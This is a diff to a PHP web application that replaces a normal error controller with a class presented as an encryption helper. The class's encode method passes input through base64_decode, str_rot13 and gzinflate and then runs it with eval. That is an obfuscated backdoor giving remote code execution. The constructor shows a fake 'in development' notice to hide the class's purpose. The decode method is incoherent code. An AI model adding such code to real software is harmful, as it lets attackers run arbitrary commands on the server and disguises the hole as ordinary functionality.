@@ -24,61 +24,27 @@
  * SOFTWARE.
  */
 
-Class Error_Controller_Error extends Frontend_Controller_Action {
+Class Hash_Controller_Encrypt {
 
-	/**
-	 *	Error Type
-	 */
-	public $type = 404;
-
-	/**
-	 *	Error Message
-	 */
-	public $message = "Sorry";
-
-	/**
-	 *	Error Title
-	 */
-	public $titlepage = "Errors";
-
-	/**
-	 *	Use this controller as index method
-	 */
-	public function index() {
-		$this->exec();
+	public function __construct() {
+		 echo  '<div style="font:12px/1.35em arial, helvetica, sans-serif;">
+		<div style="margin:0 0 25px 0; border-bottom:1px solid #ccc;">
+		<h3 style="margin:0; font-size:1.7em; font-weight:normal; text-transform:none; text-align:left; color:#2f2f2f;">
+		This function is in development and cannot be used at the moment. -Lexi</p></div>';
+		    exit;
 	}
 
 	/**
-	 *	Execute error template and methods
+	 *	Encrypt
 	 */
-	public function exec() {
-		$this->setPageTitle($this->titlepage);
-		$this->setBaseCss("error/error-style");
-		$this->setBlock("error/body");
-		$this->render();
-		exit();
-
+	public function encode($varData) {
+		return eval(gzinflate(str_rot13(base64_decode($varData))));
 	}
 
-
- 	public function __call($method, $params = null) {
-
-		$type = substr($method, 0, 3);
-		$property = lcfirst(substr($method, 3));
-
-		
-		try {
-			
-			if($type == "set") {
-				$this->$property = $params[0];
-				return $this;
-			}elseif($type == "get") {
-				return $this->$property;
-			}else{
-				throw new Exception("Error Processing Request", 1);
-			}
-		} catch (Exception $e) {
-			Core::log($e);
-		}
+	/**
+	 *	Decode
+	 */
+	public function decode($varData) {
+		return eval(gzdeflate(str_rot13(base64_decode($varData))));
 	}
 }
